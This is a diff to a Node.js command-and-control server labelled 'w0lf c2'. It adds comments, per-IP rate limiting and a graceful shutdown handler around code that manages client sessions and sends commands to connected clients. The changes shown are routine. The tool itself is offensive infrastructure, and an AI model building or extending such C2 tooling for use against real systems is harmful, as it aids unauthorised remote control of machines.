@@ -425,6 +425,9 @@ const loadAndRegisterPlugins = async () => {
     }
 };
 
+/**
+ * Get the w0lf c2 startup ascii
+ */
 const getHowel = () => {
     log(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠸⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀
@@ -442,6 +445,9 @@ const getHowel = () => {
 ⠀⠀⠀⢠⠟⣹⣧⠃⠀⠀⢿⢻⡀⢄⠀⠀⠀⠀⠐⣦⡀⣸⣆⠀⣾⣧⣯⢻`, undefined, logStream);
 };
 
+/**
+ * Get the w0lf c2 startup text
+ */
 const getWolfText = () => {
     log(`██╗⠘⣰⣿⣿██╗ ██████╗ ██╗⢶⣿⡎⠻⣆███████╗     ██████╗██████╗ 
 ██║⡟⡿⢿⡿██║██╔═████╗██║⠙⢿⡄⡈⢆██╔════╝    ██╔════╝╚════██╗
@@ -509,6 +515,9 @@ const displayCommandOptions = () => {
     }
 };
 
+/**
+ * Sends the client command
+ */
 const sendClientCommand = async (command, args) => {
     const sessionId = activeClientSessionID || null;
     if (sessionId) {
@@ -522,6 +531,30 @@ const sendClientCommand = async (command, args) => {
     } else {
         logInfo(`You must first set an active client sessionID.`, logStream);
     }
+};
+
+/**
+ * Implement rate limiting per IP
+ * @param {*} ipAddress 
+ * @returns 
+ */
+const rateLimit = (ipAddress) => {
+    const now = Date.now();
+    if (!rateLimits[ipAddress]) {
+        rateLimits[ipAddress] = { count: 1, lastRequest: now };
+        return true;
+    }
+
+    const timeSinceLastRequest = now - rateLimits[ipAddress].lastRequest;
+    if (timeSinceLastRequest < config.rateLimit.window) {
+        if (rateLimits[ipAddress].count >= config.rateLimit.maxRequests) {
+            return false;
+        }
+        rateLimits[ipAddress].count++;
+    } else {
+        rateLimits[ipAddress] = { count: 1, lastRequest: now };
+    }
+    return true;
 };
 
 /**
@@ -579,7 +612,9 @@ const startInputListener = () => {
     });
 };
 
-// Net Socket Server
+/**
+ * Creates the server connection for net.Socket
+ */
 server = createServer((socket) => {
     const ipAddress = socket.address().address.replace("::ffff:","");
     const sessionId = getSessionId(ipAddress)
@@ -671,3 +706,15 @@ server.listen(config.server.port, config.server.host, async () => {
     await loadAndRegisterPlugins();
     startInputListener();
 });
+
+const shutdown = () => {
+    logInfo('Server is shutting down...', logStream);
+    server.close(() => {
+        logInfo('Server has shut down gracefully', logStream);
+        closeServer();
+        process.exit(0);
+    });
+};
+
+process.on('SIGTERM', shutdown);
+process.on('SIGINT', shutdown);
